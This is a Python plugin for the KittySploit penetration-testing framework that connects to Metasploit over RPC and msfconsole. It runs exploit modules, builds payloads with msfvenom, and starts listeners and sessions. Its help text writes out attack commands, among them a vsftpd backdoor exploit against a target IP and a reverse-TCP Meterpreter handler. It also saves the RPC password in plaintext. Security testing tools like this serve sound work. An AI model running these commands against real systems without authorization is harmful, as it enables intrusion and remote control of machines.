#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Metasploit RPC integration plugin for KittySploit.
"""
from kittysploit import *
from typing import Dict, List, Optional, Tuple
import msgpack
import requests
import os
import shlex
import json
import shutil
import subprocess
import select
import time
import signal
import re
import termios
import shlex as shell_lex
from requests import HTTPError
from requests.exceptions import RequestException



class MetasploitRpcClient:
    """Small client for Metasploit's MessagePack RPC interface."""

    def __init__(
        self,
        host: str,
        port: int,
        username: str,
        password: str,
        *,
        use_ssl: bool = False,
        uri: str = "/api/",
        verify_ssl: bool = False,
        timeout: int = 30,
    ) -> None:
        self.host = host
        self.port = int(port)
        self.username = username
        self.password = password
        self.use_ssl = bool(use_ssl)
        normalized_uri = uri if uri.startswith("/") else f"/{uri}"
        self.uri = normalized_uri[:-1] if normalized_uri.endswith("/") and normalized_uri != "/" else normalized_uri
        self.verify_ssl = bool(verify_ssl)
        self.timeout = int(timeout)
        self.token: Optional[str] = None

    @property
    def endpoint(self) -> str:
        scheme = "https" if self.use_ssl else "http"
        return f"{scheme}://{self.host}:{self.port}{self.uri}"

    def login(self) -> str:
        errors = []
        for method in ("auth.login_noauth", "auth.login"):
            try:
                response = self.call(method, [self.username, self.password], include_token=False)
                token = response.get("token")
                if token:
                    self.token = token
                    return token
                errors.append(f"{method}: no token received")
            except HTTPError as exc:
                if exc.response is not None and exc.response.status_code == 401:
                    errors.append(f"{method}: unauthorized (check User/Pass and msgrpc instance)")
                else:
                    errors.append(f"{method}: {exc}")
            except RequestException as exc:
                errors.append(f"{method}: network error ({exc})")
            except Exception as exc:
                errors.append(f"{method}: {exc}")
        raise RuntimeError("authentication failed: " + " | ".join(errors))

    def probe_login(self) -> Tuple[bool, str]:
        try:
            self.login()
            return True, "authenticated"
        except Exception as exc:
            return False, str(exc)

    def _rpc_encode(self, value):
        if isinstance(value, str):
            return value.encode("utf-8")
        if isinstance(value, list):
            return [self._rpc_encode(item) for item in value]
        if isinstance(value, tuple):
            return tuple(self._rpc_encode(item) for item in value)
        if isinstance(value, dict):
            return {self._rpc_encode(key): self._rpc_encode(val) for key, val in value.items()}
        return value

    def _rpc_decode(self, value):
        if isinstance(value, bytes):
            try:
                return value.decode("utf-8")
            except UnicodeDecodeError:
                return value
        if isinstance(value, list):
            return [self._rpc_decode(item) for item in value]
        if isinstance(value, dict):
            return {self._rpc_decode(key): self._rpc_decode(val) for key, val in value.items()}
        return value

    def call(self, method: str, params: Optional[List] = None, *, include_token: bool = True) -> Dict:
        if requests is None:
            raise RuntimeError("missing dependency: requests")
        if msgpack is None:
            raise RuntimeError("missing dependency: msgpack")

        values: List = [method]
        if include_token:
            if not self.token:
                self.login()
            values.append(self.token)
        if params:
            values.extend(params)

        values = self._rpc_encode(values)

        # Metasploit's MessagePack RPC is historically more reliable with the
        # legacy "raw" string encoding than with modern bin types.
        packed = msgpack.packb(values, use_bin_type=False)
        response = requests.post(
            self.endpoint,
            data=packed,
            headers={"Content-Type": "binary/message-pack"},
            timeout=(3, self.timeout),
            verify=self.verify_ssl,
        )
        response.raise_for_status()
        data = self._rpc_decode(msgpack.unpackb(response.content, raw=True))
        if isinstance(data, dict) and data.get("error"):
            raise RuntimeError(str(data.get("error_message") or data.get("error")))
        return data if isinstance(data, dict) else {"result": data}


class MetasploitPlugin(Plugin):
    """Remote Metasploit RPC bridge for KittySploit."""

    __info__ = {
        "name": "metasploit",
        "description": "Connect to a remote Metasploit RPC service and use modules from KittySploit",
        "version": "1.0.0",
        "author": "KittySploit Team",
        "dependencies": ["requests"],
    }

    DEFAULT_CONFIG = os.path.join("data", "metasploit", "rpc_config.json")

    def __init__(self, framework=None):
        super().__init__(framework)
        self.client: Optional[MetasploitRpcClient] = None
        self.config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), self.DEFAULT_CONFIG)
        self.msfconsole_process: Optional[subprocess.Popen] = None
        self.msfconsole_fd: Optional[int] = None
        self.msfconsole_path: Optional[str] = None
        self.integrated_mode = False
        self.current_msf_module: Optional[str] = None
        self._msf_catalog_cache: Dict[str, List[str]] = {}
        self._msf_catalog_cache_time = 0.0
        self._msf_catalog_ttl = 60.0

    def run(self, *args, **kwargs):
        tokens = shlex.split(args[0]) if args and args[0] else []
        if not tokens:
            self._print_help()
            return True

        try:
            command = tokens[0].lower()
            if command == "connect":
                return self._cmd_connect(tokens[1:])
            if command == "probe":
                return self._cmd_connect(tokens[1:], save_config=False)
            if command == "shell":
                return self._cmd_shell(tokens[1:])
            if command == "mode":
                return self._cmd_mode(tokens[1:])
            if command == "resume":
                return self._cmd_mode(tokens[1:], resume_only=True)
            if command == "context":
                return self._cmd_context(tokens[1:])
            if command == "detach":
                return self._cmd_detach()
            if command == "stop-console":
                return self._cmd_stop_console()
            if command == "console-status":
                return self._cmd_console_status()
            if command == "status":
                return self._cmd_status()
            if command == "list":
                return self._cmd_list(tokens[1:])
            if command == "search":
                return self._cmd_search(tokens[1:])
            if command == "info":
                return self._cmd_info(tokens[1:])
            if command == "options":
                return self._cmd_options(tokens[1:])
            if command == "payloads":
                return self._cmd_payloads(tokens[1:])
            if command == "execute":
                return self._cmd_execute(tokens[1:])
            if command == "jobs":
                return self._cmd_jobs()
            if command == "sessions":
                return self._cmd_sessions()
            if command == "help":
                self._print_help()
                return True

            print_error(f"Unknown metasploit command: {command}")
            self._print_help()
            return False
        except Exception as exc:
            print_error(f"Metasploit plugin error: {exc}")
            return False

    def check_dependencies(self):
        if requests is None:
            print_error("Missing dependency for plugin 'metasploit': requests")
            return False
        if msgpack is None:
            print_warning("Optional runtime dependency 'msgpack' is not installed yet")
            print_info("Install it with: pip install msgpack")
        return True

    def _print_help(self) -> None:
        print_info("Metasploit RPC plugin")
        print_info("")
        print_info("Commands:")
        print_info("  plugin run metasploit connect --host 127.0.0.1 --port 55552 --user msf --pass secret")
        print_info("  plugin run metasploit probe --host 127.0.0.1 --port 55552 --user msf --pass secret")
        print_info("  plugin run metasploit shell")
        print_info("  plugin run metasploit shell --path /opt/metasploit-framework/bin/msfconsole")
        print_info("  plugin run metasploit mode")
        print_info("  plugin run metasploit resume")
        print_info("  plugin run metasploit context on")
        print_info("  plugin run metasploit context off")
        print_info("  plugin run metasploit detach")
        print_info("  plugin run metasploit stop-console")
        print_info("  plugin run metasploit console-status")
        print_info("  plugin run metasploit connect --host 127.0.0.1 --port 55552 --user msf --pass secret --ssl")
        print_info("  plugin run metasploit connect --host 127.0.0.1 --port 55552 --user msf --pass secret --no-ssl")
        print_info("  plugin run metasploit status")
        print_info("  plugin run metasploit list exploits")
        print_info("  plugin run metasploit search samba")
        print_info("  plugin run metasploit info exploit/unix/ftp/vsftpd_234_backdoor")
        print_info("  plugin run metasploit options exploit/unix/ftp/vsftpd_234_backdoor")
        print_info("  plugin run metasploit payloads exploit/unix/ftp/vsftpd_234_backdoor")
        print_info("  plugin run metasploit execute exploit/unix/ftp/vsftpd_234_backdoor --set RHOSTS=10.10.10.3")
        print_info("  plugin run metasploit execute exploit/multi/handler --payload payload/windows/meterpreter/reverse_tcp --set LHOST=10.0.0.5 --set LPORT=4444")
        print_info("  plugin run metasploit jobs")
        print_info("  plugin run metasploit sessions")
        print_info("")
        print_info("The plugin stores the last successful RPC connection in data/metasploit/rpc_config.json.")
        print_info("In metasploit mode, use `.kitty` to return to KittySploit without closing msfconsole.")

    def is_integrated_mode_active(self) -> bool:
        return self.integrated_mode

    def get_prompt_suffix(self) -> str:
        if not self.integrated_mode:
            return ""
        if self.current_msf_module:
            return f"msf:{self.current_msf_module}"
        return "msf"

    def _cmd_shell(self, args: List[str]) -> bool:
        msfconsole_path = "msfconsole"
        extra_args: List[str] = []

        i = 0
        while i < len(args):
            token = args[i]
            if token == "--path" and i + 1 < len(args):
                msfconsole_path = args[i + 1]
                i += 2
            elif token == "--":
                extra_args = args[i + 1:]
                break
            else:
                extra_args.append(token)
                i += 1

        resolved = shutil.which(msfconsole_path) if os.path.basename(msfconsole_path) == msfconsole_path else msfconsole_path
        if not resolved:
            raise RuntimeError(
                "msfconsole not found in PATH. Use `plugin run metasploit shell --path /full/path/to/msfconsole`."
            )
        if not os.path.exists(resolved):
            raise RuntimeError(f"msfconsole not found at '{resolved}'")

        command = [resolved, *extra_args]
        print_info("Switching to Metasploit console. Exit `msfconsole` to return to KittySploit.")
        try:
            return_code = subprocess.call(command)
        except FileNotFoundError as exc:
            raise RuntimeError(f"unable to launch msfconsole: {exc}") from exc

        if return_code == 0:
            print_success("Returned from Metasploit console")
            return True

        print_warning(f"Metasploit console exited with status {return_code}")
        return False

    def _get_interactive_input(self, prompt: str) -> str:
        return input(prompt)

    def _resolve_msfconsole_path(self, requested: str = "msfconsole") -> str:
        resolved = shutil.which(requested) if os.path.basename(requested) == requested else requested
        if not resolved:
            raise RuntimeError(
                "msfconsole not found in PATH. Use `plugin run metasploit mode --path /full/path/to/msfconsole`."
            )
        if not os.path.exists(resolved):
            raise RuntimeError(f"msfconsole not found at '{resolved}'")
        return resolved

    def _console_alive(self) -> bool:
        return self.msfconsole_process is not None and self.msfconsole_process.poll() is None

    def _read_console_output(self, duration: float = 0.15) -> None:
        if self.msfconsole_fd is None:
            return
        end = time.time() + duration
        chunks: List[str] = []
        while time.time() < end:
            ready, _, _ = select.select([self.msfconsole_fd], [], [], 0.05)
            if not ready:
                continue
            try:
                data = os.read(self.msfconsole_fd, 4096)
            except OSError:
                break
            if not data:
                break
            chunks.append(data.decode("utf-8", errors="replace"))
            if len(data) < 4096:
                break
        if chunks:
            cleaned = self._clean_console_output("".join(chunks))
            if cleaned:
                print(cleaned, end="", flush=True)

    def _drain_console_output(self) -> None:
        if self.msfconsole_fd is None:
            return
        while True:
            ready, _, _ = select.select([self.msfconsole_fd], [], [], 0)
            if not ready:
                break
            try:
                data = os.read(self.msfconsole_fd, 4096)
            except OSError:
                break
            if not data:
                break

    def _collect_console_output(self, duration: float = 0.5) -> str:
        if self.msfconsole_fd is None:
            return ""
        end = time.time() + max(duration, 1.5)
        idle_deadline = time.time() + 0.25
        chunks: List[str] = []
        prompt_pattern = re.compile(r"\n\s*msf(?:6)?(?:\s+[^\n>]*)?\s>\s*$", re.IGNORECASE)
        while time.time() < end:
            ready, _, _ = select.select([self.msfconsole_fd], [], [], 0.05)
            if not ready:
                if chunks and time.time() >= idle_deadline:
                    break
                continue
            try:
                data = os.read(self.msfconsole_fd, 4096)
            except OSError:
                break
            if not data:
                break
            chunks.append(data.decode("utf-8", errors="replace"))
            joined = "".join(chunks)
            idle_deadline = time.time() + 0.20
            if prompt_pattern.search(joined):
                break
        return self._clean_console_output("".join(chunks))

    def _clean_console_output(self, text: str) -> str:
        if not text:
            return text

        ansi_clean = re.sub(r"\x1b\[[0-9;?]*[A-Za-z]", "", text)
        lines = ansi_clean.splitlines(keepends=True)
        cleaned_lines: List[str] = []
        prompt_pattern = re.compile(r"^\s*msf(?:6)?(?:\s+[^\n>]*)?\s>\s*$")
        noise_patterns = [
            re.compile(r"^Consider running 'msfupdate' to update to the latest version\.\s*$"),
            re.compile(r"^Metasploit tip: .*", re.IGNORECASE),
            re.compile(r"^View the full module info with the info, or info -d command\.\s*$"),
            re.compile(r"^Using configured payload .*"),
        ]

        for line in lines:
            stripped = line.strip()
            if prompt_pattern.match(stripped):
                continue
            if any(pattern.match(stripped) for pattern in noise_patterns):
                continue
            cleaned_lines.append(line)

        return "".join(cleaned_lines)

    def _start_console_process(self, path: str = "msfconsole", extra_args: Optional[List[str]] = None) -> None:
        if self._console_alive():
            return

        resolved = self._resolve_msfconsole_path(path)
        master_fd, slave_fd = os.openpty()
        attrs = termios.tcgetattr(slave_fd)
        attrs[3] = attrs[3] & ~termios.ECHO
        termios.tcsetattr(slave_fd, termios.TCSANOW, attrs)
        provided_args = list(extra_args or [])
        if "-q" not in provided_args and "--quiet" not in provided_args:
            provided_args.insert(0, "-q")
        command = [resolved, *provided_args]
        process = subprocess.Popen(
            command,
            stdin=slave_fd,
            stdout=slave_fd,
            stderr=slave_fd,
            text=False,
            close_fds=True,
        )
        os.close(slave_fd)
        self.msfconsole_process = process
        self.msfconsole_fd = master_fd
        self.msfconsole_path = resolved
        self._read_console_output(duration=1.0)

    def _send_console_line(self, line: str) -> None:
        if self.msfconsole_fd is None:
            raise RuntimeError("msfconsole is not running")
        os.write(self.msfconsole_fd, (line + "\n").encode("utf-8"))

    def _exec_console_command(self, line: str, read_duration: float = 0.7, display: bool = True) -> str:
        if not self._console_alive():
            self._start_console_process(self.msfconsole_path or "msfconsole")
        self._drain_console_output()
        self._send_console_line(line)
        output = self._collect_console_output(duration=read_duration)
        if output and display:
            print(output, end="" if output.endswith("\n") else "\n", flush=True)
        return output

    def _cmd_mode(self, args: List[str], resume_only: bool = False) -> bool:
        requested_path = "msfconsole"
        extra_args: List[str] = []

        i = 0
        while i < len(args):
            token = args[i]
            if token == "--path" and i + 1 < len(args):
                requested_path = args[i + 1]
                i += 2
            else:
                extra_args.append(token)
                i += 1

        if resume_only and not self._console_alive():
            print_warning("No persistent Metasploit console is running. Starting a new one.")

        if not self._console_alive():
            self._start_console_process(requested_path, extra_args)
        else:
            print_info("Re-entering existing Metasploit mode")
            self._read_console_output(duration=0.25)

        print_info("Metasploit mode active. `.kitty` returns to KittySploit, `.stop` closes msfconsole.")

        while True:
            if not self._console_alive():
                print_warning("Metasploit console has exited")
                self._cleanup_console_handles()
                return True

            self._read_console_output(duration=0.1)

            try:
                command = self._get_interactive_input("metasploit> ")
            except (EOFError, KeyboardInterrupt):
                print_info("\nReturning to KittySploit. Metasploit console kept alive.")
                return True

            if command is None:
                return True

            stripped = command.strip()
            if not stripped:
                continue
            if stripped == ".kitty":
                print_info("Returning to KittySploit. Resume with `plugin run metasploit resume`.")
                return True
            if stripped == ".stop":
                return self._cmd_stop_console()
            if stripped == ".status":
                self._cmd_console_status()
                continue
            if stripped == ".help":
                print_info("Mode commands: `.kitty`, `.stop`, `.status`, `.help`")
                continue

            self._send_console_line(command)
            self._read_console_output(duration=0.6)

    def _cleanup_console_handles(self) -> None:
        if self.msfconsole_fd is not None:
            try:
                os.close(self.msfconsole_fd)
            except OSError:
                pass
        self.msfconsole_fd = None
        self.msfconsole_process = None
        self.msfconsole_path = None

    def _cmd_detach(self) -> bool:
        if not self._console_alive():
            print_warning("No Metasploit console is currently running")
            return True
        print_info("Metasploit console left running in background. Resume with `plugin run metasploit resume`.")
        return True

    def _cmd_stop_console(self) -> bool:
        if not self._console_alive():
            print_warning("No Metasploit console is currently running")
            self._cleanup_console_handles()
            return True

        try:
            self.msfconsole_process.terminate()
            self.msfconsole_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            self.msfconsole_process.kill()
            self.msfconsole_process.wait(timeout=2)
        except Exception as exc:
            raise RuntimeError(f"failed to stop msfconsole: {exc}") from exc
        finally:
            self._cleanup_console_handles()

        print_success("Metasploit console stopped")
        return True

    def _cmd_console_status(self) -> bool:
        if self._console_alive():
            print_success(f"Metasploit console is running via {self.msfconsole_path}")
            print_info(f"Integrated mode: {'on' if self.integrated_mode else 'off'}")
            if self.current_msf_module:
                print_info(f"Current Metasploit module: {self.current_msf_module}")
        else:
            print_info("No persistent Metasploit console is running")
        return True

    def _cmd_context(self, args: List[str]) -> bool:
        action = args[0].lower() if args else "on"
        if action in ("on", "enable", "start"):
            if not self._console_alive():
                self._start_console_process(self.msfconsole_path or "msfconsole")
            self._refresh_msf_catalog_cache(force=True)
            self.integrated_mode = True
            print_success("Integrated Metasploit mode enabled")
            print_info("Prompt will now show `msf`, and `use/show/set/run/back` will target Metasploit.")
            return True
        if action in ("off", "disable", "stop"):
            self.integrated_mode = False
            print_success("Integrated Metasploit mode disabled")
            return True
        if action == "status":
            return self._cmd_console_status()
        raise RuntimeError("usage: plugin run metasploit context [on|off|status]")

    def is_msf_payload_ref(self, payload_ref: str) -> bool:
        return isinstance(payload_ref, str) and payload_ref.startswith("msf/")

    def _normalize_payload_name(self, payload_ref: str) -> str:
        if payload_ref.startswith("msf/"):
            return payload_ref[4:]
        return payload_ref

    def _find_msfvenom(self) -> str:
        candidate = shutil.which("msfvenom")
        if not candidate:
            raise RuntimeError("msfvenom not found in PATH")
        return candidate

    def _infer_msf_payload_metadata(self, payload_ref: str) -> Dict[str, str]:
        payload_name = self._normalize_payload_name(payload_ref)
        lowered = payload_name.lower()
        handler = "bind" if "bind_" in lowered or "/bind" in lowered else "reverse"
        session_type = "meterpreter" if "meterpreter" in lowered else "shell"
        platform = "windows" if "windows" in lowered else "linux" if "linux" in lowered else "unix" if "unix" in lowered else "multi"
        return {
            "payload": payload_name,
            "listener": "metasploit/multi/handler",
            "handler": handler,
            "session_type": session_type,
            "platform": platform,
        }

    def suggest_msf_format_for_exploit(self, exploit, payload_ref: str) -> str:
        payload_name = self._normalize_payload_name(payload_ref).lower()
        option_names = set()
        try:
            option_names = {str(name).lower() for name in getattr(exploit, "exploit_attributes", {}).keys()}
        except Exception:
            option_names = set()

        cmd_like = any(name in option_names for name in {"cmd", "command", "shell", "execute", "exec"})
        file_like = any(token in name for name in option_names for token in ("file", "path", "upload", "write", "content"))

        if "windows/" in payload_name and cmd_like:
            return "psh-cmd"
        if any(token in payload_name for token in ("cmd/unix", "cmd/linux", "python/", "php/")) and cmd_like:
            return "raw"
        if "windows/" in payload_name and file_like:
            return "exe"
        if ("linux/" in payload_name or "unix/" in payload_name) and file_like:
            return "elf"
        return "raw"

    def configure_exploit_for_msf_payload(self, exploit, payload_ref: str):
        from core.framework.option.option_string import OptString
        from core.framework.option.option_port import OptPort

        metadata = self._infer_msf_payload_metadata(payload_ref)
        cls = exploit.__class__
        if not hasattr(cls, "exploit_attributes"):
            cls.exploit_attributes = {}
        else:
            cls.exploit_attributes = dict(getattr(cls, "exploit_attributes", {}))

        def add_opt(option_name, option_obj, required, description, advanced=True):
            if not hasattr(cls, option_name):
                setattr(cls, option_name, option_obj)
            cls.exploit_attributes[option_name] = [
                getattr(option_obj, "_default_display_value", str(getattr(option_obj, "_default_value", ""))),
                required,
                description,
                advanced,
            ]

        if metadata["handler"] == "reverse":
            add_opt("lhost", OptString("127.0.0.1", "Connect-back host for Metasploit payload", True), True, "Connect-back host for Metasploit payload", False)
            add_opt("lport", OptPort(4444, "Connect-back port for Metasploit payload", True), True, "Connect-back port for Metasploit payload", False)
        else:
            add_opt("rhost", OptString("", "Target host for bind payload", True), True, "Target host for bind payload", False)
            add_opt("rport", OptPort(4444, "Target port for bind payload", True), True, "Target port for bind payload", False)

        suggested_format = self.suggest_msf_format_for_exploit(exploit, payload_ref)
        add_opt("msf_format", OptString(suggested_format, "msfvenom output format", False, True), False, "msfvenom output format", True)
        add_opt("msf_options", OptString("", "Additional msfvenom/handler options (KEY=VALUE ...)", False, True), False, "Additional msfvenom/handler options", True)
        print_info(f"Metasploit payload backend enabled: {payload_ref}")
        print_info(f"Suggested msfvenom format: {suggested_format}")
        return metadata

    def _extract_msf_option_pairs(self, raw_value: str) -> Dict[str, str]:
        options: Dict[str, str] = {}
        if not raw_value:
            return options
        for token in shell_lex.split(raw_value):
            if "=" not in token:
                continue
            key, value = token.split("=", 1)
            if key:
                options[key] = value
        return options

    def _build_msf_datastore_from_exploit(self, exploit, payload_ref: str) -> Dict[str, str]:
        metadata = self._infer_msf_payload_metadata(payload_ref)
        datastore: Dict[str, str] = {}
        if metadata["handler"] == "reverse":
            datastore["LHOST"] = str(getattr(exploit, "lhost"))
            datastore["LPORT"] = str(getattr(exploit, "lport"))
        else:
            datastore["RHOST"] = str(getattr(exploit, "rhost"))
            datastore["RPORT"] = str(getattr(exploit, "rport"))

        extra_raw = getattr(exploit, "msf_options", "") or ""
        datastore.update(self._extract_msf_option_pairs(str(extra_raw)))
        return datastore

    def generate_payload_for_exploit(self, exploit, payload_ref: str):
        payload_name = self._normalize_payload_name(payload_ref)
        datastore = self._build_msf_datastore_from_exploit(exploit, payload_ref)
        msfvenom = self._find_msfvenom()
        out_format = str(getattr(exploit, "msf_format", "raw") or "raw")
        command = [msfvenom, "-p", payload_name]
        for key, value in datastore.items():
            command.append(f"{key}={value}")
        command.extend(["-f", out_format])

        result = subprocess.run(command, capture_output=True, check=False)
        if result.returncode != 0:
            stderr = result.stderr.decode("utf-8", errors="replace").strip()
            raise RuntimeError(f"msfvenom failed: {stderr or 'unknown error'}")

        output = result.stdout
        textual_payload = (
            payload_name.startswith("cmd/")
            or "/cmd/" in payload_name
            or "python/" in payload_name
            or payload_name.startswith("php/")
            or "powershell" in payload_name
            or out_format in {"raw", "python", "psh", "cmd", "bash", "perl", "ruby"}
        )
        if textual_payload:
            return output.decode("utf-8", errors="replace").strip()
        return output

    def start_msf_handler_for_exploit(self, exploit, payload_ref: str) -> Optional[int]:
        payload_name = self._normalize_payload_name(payload_ref)
        datastore = self._build_msf_datastore_from_exploit(exploit, payload_ref)
        if not self._console_alive():
            self._start_console_process(self.msfconsole_path or "msfconsole")

        self._exec_console_command("use exploit/multi/handler", read_duration=0.4)
        self._exec_console_command(f"set payload {payload_name}", read_duration=0.4)
        for key, value in datastore.items():
            self._exec_console_command(f"set {key} {value}", read_duration=0.3)
        self._exec_console_command("set ExitOnSession false", read_duration=0.3)
        output = self._exec_console_command("run -j", read_duration=1.2)
        match = re.search(r"background job\s+(\d+)", output, re.IGNORECASE)
        if match:
            return int(match.group(1))
        return None

    def stop_msf_handler_job(self, job_id: Optional[int]) -> bool:
        if job_id is None:
            return True
        if not self._console_alive():
            return True
        self._exec_console_command(f"jobs -k {job_id}", read_duration=0.6)
        return True

    def msf_use(self, module_name: str) -> bool:
        if not self.integrated_mode:
            raise RuntimeError("Metasploit integrated mode is not active")
        self._exec_console_command(f"use {module_name}")
        self.current_msf_module = module_name
        print_success(f"Using Metasploit module: {module_name}")
        return True

    def msf_show(self, what: str = "options") -> bool:
        if not self.integrated_mode:
            raise RuntimeError("Metasploit integrated mode is not active")
        command = "show options" if what == "options" else what
        self._exec_console_command(command)
        return True

    def msf_set(self, name: str, value: str) -> bool:
        if not self.integrated_mode:
            raise RuntimeError("Metasploit integrated mode is not active")
        self._exec_console_command(f"set {name} {value}")
        return True

    def msf_run(self, extra_args: Optional[List[str]] = None) -> bool:
        if not self.integrated_mode:
            raise RuntimeError("Metasploit integrated mode is not active")
        suffix = " " + " ".join(extra_args) if extra_args else ""
        self._exec_console_command(f"run{suffix}", read_duration=1.0)
        return True

    def msf_back(self) -> bool:
        if not self.integrated_mode:
            raise RuntimeError("Metasploit integrated mode is not active")
        self._exec_console_command("back")
        self.current_msf_module = None
        print_success("Exited current Metasploit module")
        return True

    def msf_search(self, query: str) -> str:
        if not self.integrated_mode:
            raise RuntimeError("Metasploit integrated mode is not active")
        return self._exec_console_command(f"search {query}", read_duration=1.2, display=False)

    def list_msf_sessions(self) -> str:
        if not self._console_alive():
            return ""
        return self._exec_console_command("sessions", read_duration=1.0)

    def access_msf_session(self, session_id: str) -> str:
        if not self._console_alive():
            return ""
        return self._exec_console_command(f"sessions -i {session_id}", read_duration=1.0)

    def kill_msf_session(self, session_id: str) -> bool:
        if not self._console_alive():
            return False
        self._exec_console_command(f"sessions -k {session_id}", read_duration=0.8)
        return True

    def _extract_module_paths_from_output(self, output: str, module_type: Optional[str] = None) -> List[str]:
        results: List[str] = []
        pattern = re.compile(r"\b((?:exploit|auxiliary|post|payload|encoder|nop)/[A-Za-z0-9_./-]+)\b")
        for match in pattern.findall(output or ""):
            if module_type and not match.startswith(module_type + "/"):
                continue
            results.append(match)
        return sorted(set(results))

    def _refresh_msf_catalog_cache(self, force: bool = False) -> Dict[str, List[str]]:
        if not self._console_alive():
            return self._msf_catalog_cache
        now = time.time()
        if not force and self._msf_catalog_cache and (now - self._msf_catalog_cache_time) < self._msf_catalog_ttl:
            return self._msf_catalog_cache

        catalog: Dict[str, List[str]] = {}
        type_to_command = {
            "exploit": "show exploits",
            "auxiliary": "show auxiliary",
            "post": "show post",
            "payload": "show payloads",
            "encoder": "show encoders",
            "nop": "show nops",
        }
        for module_type, command in type_to_command.items():
            output = self._exec_console_command(command, read_duration=1.0, display=False)
            catalog[module_type] = self._extract_module_paths_from_output(output, module_type=module_type)

        self._msf_catalog_cache = catalog
        self._msf_catalog_cache_time = now
        return catalog

    def complete_msf_modules(self, partial: str, module_type: Optional[str] = None) -> List[str]:
        if not self.integrated_mode or not self._console_alive():
            return []
        partial = (partial or "").strip()
        catalog = self._refresh_msf_catalog_cache()
        candidates: List[str] = []
        if module_type:
            candidates.extend(catalog.get(module_type, []))
        else:
            for values in catalog.values():
                candidates.extend(values)
        if not partial:
            return sorted(set(candidates))[:200]
        lowered = partial.lower()
        matched = [item for item in sorted(set(candidates)) if lowered in item.lower()]
        if matched:
            return matched[:200]
        output = self._exec_console_command(f"search {partial}", read_duration=1.0, display=False)
        return self._extract_module_paths_from_output(output, module_type=module_type)

    def complete_msf_payloads(self, partial: str) -> List[str]:
        if not self._console_alive():
            return []
        partial = (partial or "").strip()
        query = partial[4:] if partial.startswith("msf/") else partial
        payloads = self._refresh_msf_catalog_cache().get("payload", [])
        if query:
            filtered = [item for item in payloads if query.lower() in item.lower()]
        else:
            filtered = list(payloads)
        if not filtered and query:
            output = self._exec_console_command(f"search {query}", read_duration=1.0, display=False)
            filtered = self._extract_module_paths_from_output(output, module_type="payload")
        payloads = filtered[:200]
        return [f"msf/{payload}" for payload in payloads]

    def msf_info(self, module_name: Optional[str] = None) -> str:
        if not self.integrated_mode:
            raise RuntimeError("Metasploit integrated mode is not active")
        if module_name:
            return self._exec_console_command(f"info {module_name}", read_duration=1.0)
        return self._exec_console_command("info", read_duration=1.0)

    def get_cached_msf_modules(self, module_type: Optional[str] = None) -> List[Dict[str, str]]:
        if not self.integrated_mode or not self._console_alive():
            return []
        catalog = self._refresh_msf_catalog_cache()
        if module_type:
            values = catalog.get(module_type, [])
        else:
            values = []
            for items in catalog.values():
                values.extend(items)

        result: List[Dict[str, str]] = []
        for path in sorted(set(values)):
            result.append({
                "path": path,
                "name": path.split("/")[-1],
                "description": "Metasploit module",
                "type": path.split("/", 1)[0],
                "source": "metasploit",
            })
        return result

    def complete_msf_session_ids(self) -> List[str]:
        if not self._console_alive():
            return []
        output = self.list_msf_sessions()
        ids = re.findall(r"^\s*(\d+)\s+", output or "", re.MULTILINE)
        return [f"msf:{session_id}" for session_id in ids]

    def _cmd_connect(self, args: List[str], save_config: bool = True) -> bool:
        host = "127.0.0.1"
        port = 55552
        username = "msf"
        password = ""
        use_ssl: Optional[bool] = None
        verify_ssl = False
        uri = "/api/"
        timeout = 10

        i = 0
        while i < len(args):
            token = args[i]
            if token in ("--host", "-H") and i + 1 < len(args):
                host = args[i + 1]
                i += 2
            elif token in ("--port", "-P") and i + 1 < len(args):
                port = int(args[i + 1])
                i += 2
            elif token in ("--user", "-u") and i + 1 < len(args):
                username = args[i + 1]
                i += 2
            elif token in ("--pass", "--password", "-p") and i + 1 < len(args):
                password = args[i + 1]
                i += 2
            elif token == "--ssl":
                use_ssl = True
                i += 1
            elif token == "--no-ssl":
                use_ssl = False
                i += 1
            elif token == "--verify-ssl":
                verify_ssl = True
                i += 1
            elif token == "--uri" and i + 1 < len(args):
                uri = args[i + 1]
                i += 2
            elif token == "--timeout" and i + 1 < len(args):
                timeout = int(args[i + 1])
                i += 2
            else:
                raise ValueError(f"unknown connect argument: {token}")

        if not password:
            raise ValueError("missing RPC password, use --pass <password>")

        ssl_candidates = [use_ssl] if use_ssl is not None else [False, True]
        attempts = []
        client = None

        for ssl_mode in ssl_candidates:
            candidate = MetasploitRpcClient(
                host=host,
                port=port,
                username=username,
                password=password,
                use_ssl=ssl_mode,
                uri=uri,
                verify_ssl=verify_ssl,
                timeout=timeout,
            )
            ok, message = candidate.probe_login()
            attempts.append(f"{'https' if ssl_mode else 'http'}: {message}")
            print_info(f"Probe {'https' if ssl_mode else 'http'} -> {message}")
            if ok:
                client = candidate
                use_ssl = ssl_mode
                break

        if client is None:
            raise RuntimeError("connection failed: " + " | ".join(attempts))

        self.client = client
        if save_config:
            self._save_config(
                {
                    "host": host,
                    "port": port,
                    "username": username,
                    "password": password,
                    "use_ssl": use_ssl,
                    "verify_ssl": verify_ssl,
                    "uri": uri,
                    "timeout": timeout,
                }
            )
        print_success(f"Connected to Metasploit RPC at {client.endpoint}")
        return True

    def _cmd_status(self) -> bool:
        client = self._get_client()
        version = client.call("core.version")
        print_success("Metasploit RPC connection is ready")
        print_info(f"Endpoint: {client.endpoint}")
        print_info(f"Version: {version.get('version', 'unknown')}")
        print_info(f"Ruby: {version.get('ruby', 'unknown')}")
        print_info(f"API: {version.get('api', 'unknown')}")
        return True

    def _cmd_list(self, args: List[str]) -> bool:
        module_type = args[0] if args else "exploits"
        client = self._get_client()
        method = self._module_list_method(module_type)
        response = client.call(method)
        modules = response.get("modules", [])
        if not modules:
            print_warning(f"No modules returned for type '{module_type}'")
            return True
        print_info(f"Metasploit {module_type} ({len(modules)}):")
        for name in modules:
            print_info(f"  {name}")
        return True

    def _cmd_search(self, args: List[str]) -> bool:
        if not args:
            raise ValueError("usage: search <keyword>")
        keyword = " ".join(args).lower()
        client = self._get_client()
        module_types = ["exploits", "auxiliary", "post", "payloads", "encoders", "nops"]
        matches: List[Tuple[str, str]] = []

        for module_type in module_types:
            method = self._module_list_method(module_type)
            response = client.call(method)
            for name in response.get("modules", []):
                if keyword in name.lower():
                    matches.append((module_type, name))

        if not matches:
            print_warning(f"No Metasploit modules matched '{keyword}'")
            return True

        print_info(f"Matches for '{keyword}' ({len(matches)}):")
        for module_type, name in matches[:200]:
            print_info(f"  [{module_type}] {name}")
        if len(matches) > 200:
            print_warning("Output truncated to 200 matches")
        return True

